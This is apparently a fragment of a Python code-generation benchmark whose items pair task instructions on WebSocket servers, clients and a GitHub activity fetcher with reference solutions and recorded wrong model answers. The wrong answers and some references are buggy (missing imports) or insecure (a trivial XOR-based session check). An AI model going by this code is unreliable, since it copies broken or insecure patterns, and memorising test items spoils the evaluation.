    "Instruction": "Task Description: Implement a WebSocket client class in Python that establishes and manages connections to both control and data WebSocket servers, handles message exchange, and provides methods for parameter manipulation and audio data transmission.\n\nClass Description: WebSocketClient is a dual-connection WebSocket client that maintains separate connections for control commands and data transmission. It implements asynchronous communication with a server using callback-based event handling and provides thread-safe parameter operations.\n\nAttributes:\n- control_url: str - URL for the control WebSocket connection\n- data_url: str - URL for the data WebSocket connection\n- debug_mode: bool - Flag to enable debug output\n- is_running: bool - Flag indicating if the client is active\n- connection_established: threading.Event - Synchronization event for connection status\n- request_counter: int - Counter for generating unique request IDs\n- pending_requests: dict - Dictionary tracking pending parameter requests\n\nMethods:\n- __init__(control_url: str = DEFAULT_CONTROL_URL, data_url: str = DEFAULT_DATA_URL, debug_mode: bool = False) -> None - Initializes the WebSocket client with connection URLs and debug mode\n- connect() -> bool - Establishes connections to both control and data WebSocket servers\n- feed_audio(chunk: bytes, original_sample_rate: int = 16000) -> None - Sends audio data with metadata to the data WebSocket\n- on_control_message(ws: WebSocketApp, message: str) -> None - Callback for handling control channel messages\n- on_data_message(ws: WebSocketApp, message: str) -> None - Callback for handling data channel messages\n- on_error(ws: WebSocketApp, error: Exception) -> None - Callback for WebSocket errors\n- on_close(ws: WebSocketApp, close_status_code: int, close_msg: str) -> None - Callback for connection close events\n- on_control_open(ws: WebSocketApp) -> None - Callback for control connection opening\n- on_data_open(ws: WebSocketApp) -> None - Callback for data connection opening\n- set_parameter(parameter: str, value: Any) -> None - Sends a parameter set command to the server\n- get_parameter(parameter: str) -> Optional[Any] - Requests a parameter value from the server and waits for response\n- call_method(method: str, args: Optional[List] = None, kwargs: Optional[dict] = None) -> None - Calls a remote method on the server\n- shutdown() -> None - Gracefully shuts down both WebSocket connections",
    "Canonical_solution": "from typing import List, Optional, Union\nfrom urllib.parse import urlparse\nfrom websocket import WebSocketApp\nfrom websocket import ABNF\nimport threading\nimport socket\nimport struct\nimport json\n\nDEFAULT_CONTROL_URL = \"ws://127.0.0.1:8011\"\nDEFAULT_DATA_URL = \"ws://127.0.0.1:8012\"\n\nclass WebSocketClient:\n    def __init__(self, control_url: str = DEFAULT_CONTROL_URL, data_url: str = DEFAULT_DATA_URL, debug_mode: bool = False):\n        self.control_url = control_url\n        self.data_url = data_url\n        self.debug_mode = debug_mode\n        self.is_running = True\n        self.connection_established = threading.Event()\n        self.request_counter = 0\n        self.pending_requests = {}  # Map from request_id to threading.Event and value\n\n    def connect(self):\n        try:\n            # Connect to control WebSocket\n            self.control_ws = WebSocketApp(self.control_url,\n                                         on_message=self.on_control_message,\n                                         on_error=self.on_error,\n                                         on_close=self.on_close,\n                                         on_open=self.on_control_open)\n\n            self.control_ws_thread = threading.Thread(target=self.control_ws.run_forever)\n            self.control_ws_thread.daemon = False\n            self.control_ws_thread.start()\n\n            # Connect to data WebSocket\n            self.data_ws = WebSocketApp(self.data_url,\n                                      on_message=self.on_data_message,\n                                      on_error=self.on_error,\n                                      on_close=self.on_close,\n                                      on_open=self.on_data_open)\n\n            self.data_ws_thread = threading.Thread(target=self.data_ws.run_forever)\n            self.data_ws_thread.daemon = False\n            self.data_ws_thread.start()\n\n            # Wait for the connections to be established\n            if not self.connection_established.wait(timeout=10):\n                if self.debug_mode:\n                    print(\"Timeout while connecting to the server.\")\n                return False\n\n            if self.debug_mode:\n                print(\"WebSocket connections established successfully.\")\n            return True\n        except Exception as e:\n            if self.debug_mode:\n                print(f\"Error while connecting to the server: {e}\")\n            return False\n\n    def feed_audio(self, chunk, original_sample_rate=16000):\n        metadata = {\"sampleRate\": original_sample_rate}\n        metadata_json = json.dumps(metadata)\n        metadata_length = len(metadata_json)\n        message = struct.pack('<I', metadata_length) + metadata_json.encode('utf-8') + chunk\n\n        if self.is_running:\n            self.data_ws.send(message, opcode=ABNF.OPCODE_BINARY)\n\n    def on_control_message(self, ws, message):\n        try:\n            data = json.loads(message)\n            if 'status' in data:\n                if data['status'] == 'success':\n                    if 'parameter' in data and 'value' in data:\n                        request_id = data.get('request_id')\n                        if request_id is not None and request_id in self.pending_requests:\n                            if self.debug_mode:\n                                print(f\"Parameter {data['parameter']} = {data['value']}\")\n                            self.pending_requests[request_id]['value'] = data['value']\n                            self.pending_requests[request_id]['event'].set()\n                elif data['status'] == 'error':\n                    if self.debug_mode:\n                        print(f\"Server Error: {data.get('message', '')}\")\n            else:\n                if self.debug_mode:\n                    print(f\"Unknown control message format: {data}\")\n        except json.JSONDecodeError:\n            if self.debug_mode:\n                print(f\"Received non-JSON control message: {message}\")\n        except Exception as e:\n            if self.debug_mode:\n                print(f\"Error processing control message: {e}\")\n\n    def on_data_message(self, ws, message):\n        try:\n            data = json.loads(message)\n            if self.debug_mode:\n                print(f\"Received data message: {data}\")\n        except json.JSONDecodeError:\n            if self.debug_mode:\n                print(f\"Received non-JSON data message: {message}\")\n        except Exception as e:\n            if self.debug_mode:\n                print(f\"Error processing data message: {e}\")\n\n    def on_error(self, ws, error):\n        if self.debug_mode:\n            print(f\"WebSocket error: {error}\")\n\n    def on_close(self, ws, close_status_code, close_msg):\n        if self.debug_mode:\n            if ws == self.data_ws:\n                print(f\"Data WebSocket connection closed: {close_status_code} - {close_msg}\")\n            elif ws == self.control_ws:\n                print(f\"Control WebSocket connection closed: {close_status_code} - {close_msg}\")\n        \n        self.is_running = False\n\n    def on_control_open(self, ws):\n        if self.debug_mode:\n            print(\"Control WebSocket connection opened.\")\n        self.connection_established.set()\n\n    def on_data_open(self, ws):\n        if self.debug_mode:\n            print(\"Data WebSocket connection opened.\")\n\n    def set_parameter(self, parameter, value):\n        command = {\n            \"command\": \"set_parameter\",\n            \"parameter\": parameter,\n            \"value\": value\n        }\n        self.control_ws.send(json.dumps(command))\n\n    def get_parameter(self, parameter):\n        request_id = self.request_counter\n        self.request_counter += 1\n\n        command = {\n            \"command\": \"get_parameter\",\n            \"parameter\": parameter,\n            \"request_id\": request_id\n        }\n\n        event = threading.Event()\n        self.pending_requests[request_id] = {'event': event, 'value': None}\n\n        self.control_ws.send(json.dumps(command))\n\n        if event.wait(timeout=5):\n            value = self.pending_requests[request_id]['value']\n            del self.pending_requests[request_id]\n            return value\n        else:\n            if self.debug_mode:\n                print(f\"Timeout waiting for get_parameter {parameter}\")\n            del self.pending_requests[request_id]\n            return None\n\n    def call_method(self, method, args=None, kwargs=None):\n        command = {\n            \"command\": \"call_method\",\n            \"method\": method,\n            \"args\": args or [],\n            \"kwargs\": kwargs or {}\n        }\n        self.control_ws.send(json.dumps(command))\n\n    def shutdown(self):\n        self.is_running = False\n        if hasattr(self, 'control_ws'):\n            self.control_ws.close()\n        if hasattr(self, 'data_ws'):\n            self.data_ws.close()\n\n        if hasattr(self, 'control_ws_thread'):\n            self.control_ws_thread.join()\n        if hasattr(self, 'data_ws_thread'):\n            self.data_ws_thread.join()",
    "Code_level": "Class-level",
    "FSMID_for_test": 47,
    "wrong_result": "```python\nimport threading\nimport asyncio\nimport websockets\nimport json\nfrom typing import Any, Optional, List\n\nDEFAULT_CONTROL_URL = \"ws://localhost:8080/control\"\nDEFAULT_DATA_URL = \"ws://localhost:8080/data\"\n\nclass WebSocketClient:\n    def __init__(self, control_url: str = DEFAULT_CONTROL_URL, data_url: str = DEFAULT_DATA_URL, debug_mode: bool = False):\n        self.control_url = control_url\n        self.data_url = data_url\n        self.debug_mode = debug_mode\n        self.is_running = False\n        self.connection_established = threading.Event()\n        self.request_counter = 0\n        self.pending_requests = {}\n\n    async def connect(self):\n        self.is_running = True\n        self.control_ws = await websockets.connect(self.control_url)\n        self.data_ws = await websockets.connect(self.data_url)\n        self.connection_established.set()\n\n    async def feed_audio(self, chunk: bytes, original_sample_rate: int = 16000):\n        await self.data_ws.send(json.dumps({\n            \"type\": \"audio\",\n            \"data\": chunk,\n            \"sample_rate\": original_sample_rate\n        }))\n\n    async def on_control_message(self, ws, message):\n        message = json.loads(message)\n        if \"request_id\" in message:\n            self.pending_requests[message[\"request_id\"]].set(message.get(\"result\"))\n        else:\n            print(f\"Control message: {message}\")\n\n    async def on_data_message(self, ws, message):\n        print(f\"Data message: {message}\")\n\n    async def on_error(self, ws, error):\n        print(f\"Error: {error}\")\n\n    async def on_close(self, ws, close_status_code, close_msg):\n        print(f\"Connection closed: {close_msg}\")\n\n    async def on_control_open(self, ws):\n        print(\"Control connection opened\")\n\n    async def on_data_open(self, ws):\n        print(\"Data connection opened\")\n\n    async def set_parameter(self, parameter: str, value: Any):\n        request_id = self.request_counter\n        self.request_counter += 1\n        self.pending_requests[request_id] = threading.Event()\n        await self.control_ws.send(json.dumps({\n            \"type\": \"set_parameter\",\n            \"parameter\": parameter,\n            \"value\": value,\n            \"request_id\": request_id\n        }))\n        await self.pending_requests[request_id].wait()\n        del self.pending_requests[request_id]\n\n    async def get_parameter(self, parameter: str) -> Optional[Any]:\n        request_id = self.request_counter\n        self.request_counter += 1\n        self.pending_requests[request_id] = threading.Event()\n        await self.control_ws.send(json.dumps({\n            \"type\": \"get_parameter\",\n            \"parameter\": parameter,\n            \"request_id\": request_id\n        }))\n        await self.pending_requests[request_id].wait()\n        result = self.pending_requests[request_id].result()\n        del self.pending_requests[request_id]\n        return result\n\n    async def call_method(self, method: str, args: Optional[List] = None, kwargs: Optional[dict] = None):\n        request_id = self.request_counter\n        self.request_counter += 1\n        self.pending_requests[request_id] = threading.Event()\n        await self.control_ws.send(json.dumps({\n            \"type\": \"call_method\",\n            \"method\": method,\n            \"args\": args,\n            \"kwargs\": kwargs,\n            \"request_id\": request_id\n        }))\n        await self.pending_requests[request_id].wait()\n        result = self.pending_requests[request_id].result()\n        del self.pending_requests[request_id]\n        return result\n\n    async def shutdown(self):\n        await self.control_ws.close()\n        await self.data_ws.close()\n        self.is_running = False\n```\n"
  },
  {
    "Task_id": 445,
    "Instruction": "Task Description: Implement a WebSocket server using FastAPI that validates user sessions by performing a bitwise operation on received user and session IDs.\n\nFunction Description: The function `websocket_endpoint` establishes a WebSocket connection, receives binary data containing user and session IDs, validates them using a specific bitwise operation, and sends back the validation result as binary data.\n\nInput: \n- websocket: WebSocket - The WebSocket connection object provided by FastAPI\n- data: bytes - Binary data received from the client containing packed user_id and session_id (two unsigned 32-bit integers in little-endian format)\n\nOutput: \n- None (The function sends binary data back through the WebSocket connection but doesn't return anything)\n- The sent data contains a packed unsigned 32-bit integer (little-endian) representing the validation result (1 for valid, 0 for invalid)",
    "Canonical_solution": "from fastapi import FastAPI, WebSocket\nimport struct\n\napp = FastAPI()\n\n@app.websocket('/validate_session_ws')\nasync def websocket_endpoint(websocket: WebSocket):\n    await websocket.accept()\n    while True:\n        data = await websocket.receive_bytes()\n        user_id, session_id = struct.unpack('<II', data)\n        result = (user_id ^ session_id) % 23 == 0\n        await websocket.send_bytes(struct.pack('<I', result))",
    "Code_level": "Function-level",
    "FSMID_for_test": 48,
    "wrong_result": "```python\nfrom fastapi import WebSocket\nfrom fastapi.websockets import WebSocketDisconnect\nfrom struct import pack, unpack\n\nasync def websocket_endpoint(websocket: WebSocket):\n    await websocket.accept()\n    try:\n        while True:\n            data = await websocket.receive_bytes()\n            user_id, session_id = unpack('<II', data)\n            validation_result = user_id & session_id\n            await websocket.send_bytes(pack('<I', validation_result))\n    except WebSocketDisconnect:\n        pass\n```"
  },
  {
    "Task_id": 446,
    "Instruction": "Task Description: Create a WebSocket server using FastAPI that accepts client connections, sends a sequence of numbers at a specified interval, and then closes the connection.\n\nFunction Description: The function `websocket_endpoint` establishes a WebSocket connection with a client, sends a sequence of numbers (0 to 4) at a specified time interval, and then closes the connection. It handles any exceptions that may occur during the process.\n\nInput:  \n- `websocket`: WebSocket - The WebSocket connection instance provided by FastAPI.  \n- `interval`: int (default: 1) - The time interval (in seconds) between sending consecutive numbers.  \n\nOutput: None (The function sends messages over the WebSocket but does not return any value.)",
    "Canonical_solution": "import asyncio\nfrom fastapi import FastAPI, WebSocket\n\napp = FastAPI()\n\n@app.websocket(\"/ws\")\nasync def websocket_endpoint(websocket: WebSocket, interval: int = 1):\n    await websocket.accept()\n    try:\n        for i in range(5):\n            await websocket.send_text(str(i))\n            await asyncio.sleep(interval)\n        await websocket.close()\n    except Exception as e:\n        print(e)",
    "Code_level": "Function-level",
    "FSMID_for_test": 48,
    "wrong_result": "```python\nfrom fastapi import WebSocket\nimport asyncio\n\nasync def websocket_endpoint(websocket: WebSocket, interval: int = 1):\n    await websocket.accept()\n    try:\n        for i in range(5):\n            await websocket.send_text(str(i))\n            await asyncio.sleep(interval)\n    except Exception as e:\n        print(f\"An error occurred: {e}\")\n    finally:\n        await websocket.close()\n```"
  },
  {
    "Task_id": 447,
    "Instruction": "Task Description: Implement a WebSocket connection manager class for handling multiple client connections, supporting different subprotocols (JSON and BYTES), and managing message sending/receiving.\n\nClass Description: The ConnectionManager class manages active WebSocket connections, handles different WebSocket subprotocols, and provides methods for sending/receiving messages in the appropriate format.\n\nAttributes:\n- active_connections: List[WebSocket] - Maintains a list of currently active WebSocket connections\n- protocol_dict: Dict[str, WebsocketSubProtocols] - Maps client addresses to their chosen subprotocols\n\nMethods:\n- get_client(websocket: WebSocket) -> str - Returns a string identifier for the client (host:port)\n- get_subprotocol(headers: Dict) -> WebsocketSubProtocols - Determines the subprotocol from request headers\n- connect(websocket: WebSocket) -> None - Accepts a new WebSocket connection and stores its subprotocol\n- disconnect(websocket: WebSocket) -> None - Removes a disconnected WebSocket from active connections\n- receive(websocket: WebSocket) -> Any - Receives a message from the WebSocket using the appropriate subprotocol\n- iter(websocket: WebSocket) -> AsyncIterator[Any] - Provides an async iterator for continuously receiving messages\n- send(websocket: WebSocket, data: Union[DataRequest, StatusMessage]) -> None - Sends data through the WebSocket using the appropriate subprotocol",
    "Canonical_solution": "from typing import Any, AsyncIterator, Dict, List, Optional, Union\nfrom fastapi import FastAPI, Response, WebSocket, WebSocketDisconnect, status\nfrom jina.enums import WebsocketSubProtocols\nfrom jina.excepts import InternalNetworkError\nfrom jina.types.request.data import DataRequest\nfrom jina.types.request.status import StatusMessage\n\nclass ConnectionManager:\n    def __init__(self):\n        self.active_connections: List[WebSocket] = []\n        self.protocol_dict: Dict[str, WebsocketSubProtocols] = {}\n\n    def get_client(self, websocket: WebSocket) -> str:\n        return f'{websocket.client.host}:{websocket.client.port}'\n\n    def get_subprotocol(self, headers: Dict):\n        try:\n            if 'sec-websocket-protocol' in headers:\n                subprotocol = WebsocketSubProtocols(headers['sec-websocket-protocol'])\n            elif b'sec-websocket-protocol' in headers:\n                subprotocol = WebsocketSubProtocols(headers[b'sec-websocket-protocol'].decode())\n            else:\n                subprotocol = WebsocketSubProtocols.JSON\n        except Exception:\n            subprotocol = WebsocketSubProtocols.JSON\n        return subprotocol\n\n    async def connect(self, websocket: WebSocket):\n        await websocket.accept()\n        subprotocol = self.get_subprotocol(dict(websocket.scope['headers']))\n        self.active_connections.append(websocket)\n        self.protocol_dict[self.get_client(websocket)] = subprotocol\n\n    def disconnect(self, websocket: WebSocket):\n        self.protocol_dict.pop(self.get_client(websocket))\n        self.active_connections.remove(websocket)\n\n    async def receive(self, websocket: WebSocket) -> Any:\n        subprotocol = self.protocol_dict[self.get_client(websocket)]\n        if subprotocol == WebsocketSubProtocols.JSON:\n            return await websocket.receive_json(mode='text')\n        elif subprotocol == WebsocketSubProtocols.BYTES:\n            return await websocket.receive_bytes()\n\n    async def iter(self, websocket: WebSocket) -> AsyncIterator[Any]:\n        try:\n            while True:\n                yield await self.receive(websocket)\n        except WebSocketDisconnect:\n            pass\n\n    async def send(self, websocket: WebSocket, data: Union[DataRequest, StatusMessage]) -> None:\n        subprotocol = self.protocol_dict[self.get_client(websocket)]\n        if subprotocol == WebsocketSubProtocols.JSON:\n            return await websocket.send_json(data.to_dict(), mode='text')\n        elif subprotocol == WebsocketSubProtocols.BYTES:\n            return await websocket.send_bytes(data.to_bytes())",
    "Code_level": "Class-level",
    "FSMID_for_test": 48,
    "wrong_result": "```python\nfrom typing import Dict, List, Union, Any, AsyncIterator\nfrom websockets import WebSocket, WebSocketSubProtocols, DataRequest, StatusMessage\n\n\nclass ConnectionManager:\n    def __init__(self):\n        self.active_connections: List[WebSocket] = []\n        self.protocol_dict: Dict[str, WebsocketSubProtocols] = {}\n\n    def get_client(self, websocket: WebSocket) -> str:\n        return f\"{websocket.remote_address[0]}:{websocket.remote_address[1]}\"\n\n    def get_subprotocol(self, headers: Dict) -> WebsocketSubProtocols:\n        return headers.get(\"Sec-WebSocket-Protocol\")\n\n    async def connect(self, websocket: WebSocket) -> None:\n        subprotocol = self.get_subprotocol(websocket.request_headers)\n        self.protocol_dict[self.get_client(websocket)] = subprotocol\n        await websocket.accept(subprotocol)\n        self.active_connections.append(websocket)\n\n    async def disconnect(self, websocket: WebSocket) -> None:\n        client = self.get_client(websocket)\n        if client in self.protocol_dict:\n            del self.protocol_dict[client]\n        self.active_connections.remove(websocket)\n\n    async def receive(self, websocket: WebSocket) -> Any:\n        client = self.get_client(websocket)\n        if client in self.protocol_dict:\n            protocol = self.protocol_dict[client]\n            if protocol == \"JSON\":\n                return await websocket.recv_json()\n            elif protocol == \"BYTES\":\n                return await websocket.recv()\n        return None\n\n    async def iter(self, websocket: WebSocket) -> AsyncIterator[Any]:\n        while True:\n            message = await self.receive(websocket)\n            if message is None:\n                break\n            yield message\n\n    async def send(self, websocket: WebSocket, data: Union[DataRequest, StatusMessage]) -> None:\n        client = self.get_client(websocket)\n        if client in self.protocol_dict:\n            protocol = self.protocol_dict[client]\n            if protocol == \"JSON\":\n                await websocket.send_json(data)\n            elif protocol == \"BYTES\":\n                await websocket.send(data)\n```\n"
  },
  {
    "Task_id": 448,
    "Instruction": "Task Description: Implement a WebSocket server using Tornado in Python that handles WebSocket connections, processes incoming messages, and manages connection lifecycle events.\n\nClass Description: WebSocketServer is a class that sets up a Tornado WebSocket server with an echo handler that sends received messages back to the client.\n\nAttributes:\n- close_future: [Future] - A Future object used to track when the WebSocket connection is closed.\n- app: [Application] - The Tornado web application instance that routes WebSocket connections.\n\nMethods:\n- __init__: [__init__]() -> [None] - Initializes the WebSocket server, creates the Application instance, and sets up the echo handler route.\n- get_app: [get_app]() -> [Application] - Returns the Tornado web application instance.\n- ws_connect: [ws_connect](path: str, **kwargs: dict) -> [WebSocketClientConnection] - Establishes a WebSocket connection to the specified path with optional connection parameters.\n\nClass Description: TestWebSocketHandler is a base WebSocket handler class that provides common functionality for WebSocket connections.\n\nAttributes:\n- close_future: [Future] - A Future object used to signal when the connection is closed.\n- compression_options: [dict] - Options for WebSocket compression.\n\nMethods:\n- initialize: [initialize](close_future: Future = None, compression_options: dict = None) -> [None] - Initializes the handler with optional close_future and compression_options.\n- get_compression_options: [get_compression_options]() -> [dict] - Returns the compression options for the WebSocket connection.\n- on_close: [on_close]() -> [None] - Called when the WebSocket connection is closed; resolves the close_future if it exists.\n\nClass Description: EchoHandler is a WebSocket handler that echoes received messages back to the client.\n\nMethods:\n- on_message: [on_message](message: str or bytes) -> [None] - Handles incoming WebSocket messages and echoes them back to the client. Handles cancellation and closed connection errors gracefully.",
    "Canonical_solution": "from tornado.websocket import WebSocketHandler\nfrom tornado.web import Application\nfrom tornado.concurrent import Future\nfrom tornado import gen\n\nclass TestWebSocketHandler(WebSocketHandler):\n    def initialize(self, close_future=None, compression_options=None):\n        self.close_future = close_future\n        self.compression_options = compression_options\n\n    def get_compression_options(self):\n        return self.compression_options\n\n    def on_close(self):\n        if self.close_future is not None:\n            self.close_future.set_result((self.close_code, self.close_reason))\n\nclass EchoHandler(TestWebSocketHandler):\n    @gen.coroutine\n    def on_message(self, message):\n        try:\n            yield self.write_message(message, isinstance(message, bytes))\n        except asyncio.CancelledError:\n            pass\n        except WebSocketClosedError:\n            pass\n\nclass WebSocketServer:\n    def __init__(self):\n        self.close_future = Future()\n        self.app = Application([\n            (\"/echo\", EchoHandler, dict(close_future=self.close_future))\n        ])\n\n    def get_app(self):\n        return self.app\n\n    @gen.coroutine\n    def ws_connect(self, path, **kwargs):\n        ws = yield websocket_connect(\n            \"ws://127.0.0.1:%d%s\" % (self.get_http_port(), path), **kwargs\n        )\n        raise gen.Return(ws)",
    "Code_level": "Class-level",
    "FSMID_for_test": 50,
    "wrong_result": "```python\nimport tornado.web\nimport tornado.websocket\nfrom tornado.concurrent import Future\n\nclass WebSocketServer:\n    def __init__(self):\n        self.close_future = Future()\n        self.app = tornado.web.Application([\n            (r'/ws', EchoHandler, dict(close_future=self.close_future)),\n        ])\n\n    def get_app(self):\n        return self.app\n\n    def ws_connect(self, path, **kwargs):\n        return tornado.websocket.websocket_connect(path, **kwargs)\n\nclass TestWebSocketHandler(tornado.websocket.WebSocketHandler):\n    def initialize(self, close_future=None, compression_options=None):\n        self.close_future = close_future\n        self.compression_options = compression_options\n\n    def get_compression_options(self):\n        return self.compression_options\n\n    def on_close(self):\n        if self.close_future:\n            self.close_future.set_result(None)\n\nclass EchoHandler(TestWebSocketHandler):\n    def on_message(self, message):\n        try:\n            self.write_message(message)\n        except tornado.websocket.WebSocketClosedError:\n            pass\n```\n"
  },
  {
    "Task_id": 449,
    "Instruction": "Task Description: Implement a WebSocket server using Tornado in Python to handle real-time communication between clients and the server. The server should manage WebSocket connections, handle incoming messages, and broadcast messages to all connected clients.\n\nClass Description: The WebServer class encapsulates the functionality to start a Tornado-based WebSocket server, manage client connections, and publish messages to all connected clients.\n\nAttributes:\n- path: str - The base path for the WebSocket endpoint.\n- port: int - The port number on which the server will listen (default is 8080).\n- application: tornado.web.Application - The Tornado application instance that handles WebSocket routes.\n- _server: tornado.httpserver.HTTPServer - The HTTP server instance that serves the application.\n\nMethods:\n- __init__(path, port=8080) -> None - Initializes the WebServer instance with the specified path and port. Sets up the Tornado application and initializes the list of WebSocket handlers.\n- start() -> None - Starts the Tornado HTTP server and begins listening for WebSocket connections on the specified port. This method blocks and runs the Tornado I/O loop.\n- publish(message) -> None - Broadcasts the given message to all connected WebSocket clients. The message should be a string or JSON-serializable object.",
    "Canonical_solution": "import tornado.websocket\nimport tornado.web\nimport logging\n\nclass WebSocketHandler(tornado.websocket.WebSocketHandler):\n    def open(self):\n        if self not in self.application._socketHandlers:\n            self.application._socketHandlers.append(self)\n\n    def on_close(self):\n        if self in self.application._socketHandlers:\n            self.application._socketHandlers.remove(self)\n\n    def on_message(self, msg):\n        pass\n\nclass WebServer:\n    def __init__(self, path, port=8080):\n        self.path = path\n        self.port = port\n        self.application = tornado.web.Application([\n            (r'/_cactus/ws', WebSocketHandler),\n        ])\n        self.application._socketHandlers = []\n\n    def start(self):\n        self._server = tornado.httpserver.HTTPServer(self.application)\n        self._server.listen(self.port)\n        tornado.ioloop.IOLoop.instance().start()\n\n    def publish(self, message):\n        for ws in self.application._socketHandlers:\n            ws.write_message(message)",
    "Code_level": "Class-level",
    "FSMID_for_test": 50,
    "wrong_result": "```python\nimport json\nimport tornado.ioloop\nimport tornado.web\nimport tornado.websocket\n\nclass WebServer:\n    def __init__(self, path, port=8080):\n        self.path = path\n        self.port = port\n        self.application = tornado.web.Application([\n            (self.path, WebSocketHandler),\n        ])\n        self._server = tornado.httpserver.HTTPServer(self.application)\n\n    def start(self):\n        self._server.listen(self.port)\n        tornado.ioloop.IOLoop.current().start()\n\n    def publish(self, message):\n        message = json.dumps(message)\n        for handler in WebSocketHandler.handlers:\n            handler.write_message(message)\n\nclass WebSocketHandler(tornado.websocket.WebSocketHandler):\n    handlers = []\n\n    def open(self):\n        WebSocketHandler.handlers.append(self)\n\n    def on_close(self):\n        WebSocketHandler.handlers.remove(self)\n\n    def on_message(self, message):\n        pass\n```"
  },
  {
    "Task_id": 45,
    "Instruction": "Task Description: Create an asynchronous function to fetch GitHub contributor activity data for a specific repository, filtering by time period and excluding certain users.\n\nFunction Description: This function retrieves GitHub events for a repository and processes them to track contributor activity, including created issues, pull requests, and merged commits. It filters events by date and excludes specified users, using GitHub's API with authentication.\n\nInput:\n- owner: str - GitHub repository owner username\n- repo: str - GitHub repository name\n- since: datetime - Minimum datetime for events to include\n- max: int (default=100) - Maximum number of events to fetch\n- excluded_users: set[str] | None (default=None) - Set of usernames to exclude\n- token: str | None (default=None) - GitHub API token (falls back to Marvin settings if None)\n\nOutput:\n- dict[str, dict[str, str | list]] - Dictionary mapping contributor usernames to their activity data, where each value is a dictionary containing:\n  - \"created_issues\": list - Opened issues by the contributor\n  - \"created_pull_requests\": list - Opened PRs by the contributor\n  - \"merged_commits\": list - Merged commits by the contributor (excluding merge commits)",
    "Canonical_solution": "import httpx\nimport marvin\nfrom datetime import datetime\n\nasync def fetch_contributor_data(\n    owner: str,\n    repo: str,\n    since: datetime,\n    max: int = 100,\n    excluded_users: set[str] | None = None,\n    token: str | None = None,\n) -> dict[str, dict[str, str | list]]:\n    if not excluded_users:\n        excluded_users = {}\n\n    if not token:\n        token = marvin.settings.github_token.get_secret_value()\n\n    events_url = f\"https://api.github.com/repos/{owner}/{repo}/events?per_page={max}\"\n\n    contributors_activity = {}\n\n    async with httpx.AsyncClient(\n        headers={\n            \"Accept\": \"application/vnd.github.v3+json\",\n            \"Authorization\": f\"token {token}\",\n        }\n    ) as client:\n        events = (await client.get(events_url)).json()\n\n        for event in events:\n            if (actor := event.get(\"actor\")) and actor[\"login\"] in excluded_users:\n                continue\n            created_at = datetime.fromisoformat(event[\"created_at\"].rstrip(\"Z\"))\n            if created_at < since:\n                continue\n\n            contributor_username = actor[\"login\"] if actor else \"unknown\"\n\n            if contributor_username not in contributors_activity:\n                contributors_activity[contributor_username] = {\n                    \"created_issues\": [],\n                    \"created_pull_requests\": [],\n                    \"merged_commits\": [],\n                }\n\n            if (\n                event[\"type\"] == \"IssuesEvent\"\n                and event[\"payload\"][\"action\"] == \"opened\"\n            ):\n                contributors_activity[contributor_username][\"created_issues\"].append(\n                    event[\"payload\"][\"issue\"]\n                )\n\n            elif (\n                event[\"type\"] == \"PullRequestEvent\"\n                and event[\"payload\"][\"action\"] == \"opened\"\n            ):\n                contributors_activity[contributor_username][\n                    \"created_pull_requests\"\n                ].append(event[\"payload\"][\"pull_request\"])\n\n            elif event[\"type\"] == \"PushEvent\":\n                for commit_data in event[\"payload\"][\"commits\"]:\n                    commit = (await client.get(commit_data[\"url\"])).json()\n                    commit_message = commit[\"commit\"][\"message\"].split(\"\\n\")\n                    cleaned_commit_message = \"\\n\".join(\n                        line\n                        for line in commit_message\n                        if not line.strip().lower().startswith(\"co-authored-by:\")\n                    )\n                    commit_msg = commit[\"commit\"][\"message\"] = cleaned_commit_message\n\n                    if (\n                        \"Merge remote-tracking branch\" not in commit_msg\n                        and \"Merge branch\" not in commit_msg\n                    ):\n                        contributors_activity[contributor_username][\n                            \"merged_commits\"\n                        ].append(commit)\n\n    return contributors_activity",
    "Code_level": "Function-level",
    "FSMID_for_test": 59,
    "wrong_result": "```python\nimport asyncio\nimport datetime\nimport json\nimport logging\nfrom typing import Dict, List, Optional, Set\n\nimport aiohttp\n\nfrom marvin import settings\n\nlogger = logging.getLogger(__name__)\n\n\nasync def fetch_github_events(owner: str, repo: str, since: datetime.datetime, max: int = 100, excluded_users: Optional[Set[str]] = None, token: Optional[str] = None) -> Dict[str, Dict[str, str | List]]:\n    if excluded_users is None:\n        excluded_users = set()\n\n    if token is None:\n        token = settings.GITHUB_TOKEN\n\n    headers = {\n        \"Authorization\": f\"token {token}\",\n        \"Accept\": \"application/vnd.github.v3+json\",\n    }\n\n    url = f\"https://api.github.com/repos/{owner}/{repo}/events\"\n    params = {\n        \"per_page\": max,\n        \"since\": since.isoformat(),\n    }\n\n    async with aiohttp.ClientSession(headers=headers) as session:\n        async with session.get(url, params=params) as response:\n            if response.status != 200:\n                logger.error(f\"Failed to fetch GitHub events for {owner}/{repo}: {response.status}\")\n                return {}\n\n            events = await response.json()\n\n    contributors = {}\n    for event in events:\n        if event[\"actor\"][\"login\"] in excluded_users:\n            continue\n\n        if event[\"type\"] == \"IssuesEvent\" and event[\"payload\"][\"action\"] == \"opened\":\n            contributor = event[\"actor\"][\"login\"]\n            if contributor not in contributors:\n                contributors[contributor] = {\"created_issues\": [], \"created_pull_requests\": [], \"merged_commits\": []}\n            contributors[contributor][\"created_issues\"].append(event[\"payload\"][\"issue\"][\"html_url\"])\n\n        elif event[\"type\"] == \"PullRequestEvent\" and event[\"payload\"][\"action\"] == \"opened\":\n            contributor = event[\"actor\"][\"login\"]\n            if contributor not in contributors:\n                contributors[contributor] = {\"created_issues\": [], \"created_pull_requests\": [], \"merged_commits\": []}\n            contributors[contributor][\"created_pull_requests\"].append(event[\"payload\"][\"pull_request\"][\"html_url\"])\n\n        elif event[\"type\"] == \"PushEvent\":\n            for commit in event[\"payload\"][\"commits\"]:\n                if commit[\"author\"][\"name\"] in excluded_users:\n                    continue\n\n                if commit[\"author\"][\"name\"] not in contributors:\n                    contributors[commit[\"author\"][\"name\"]] = {\"created_issues\": [], \"created_pull_requests\": [], \"merged_commits\": []}\n\n                if commit[\"message\"].startswith(\"Merge pull request\"):\n                    contributors[commit[\"author\"][\"name\"]][\"merged_commits\"].append(commit[\"html_url\"])\n                else:\n                    contributors[commit[\"author\"][\"name\"]][\"merged_commits\"].append(commit[\"html_url\"])\n\n    return contributors\n```"
  },
  {
    "Task_id": 450,
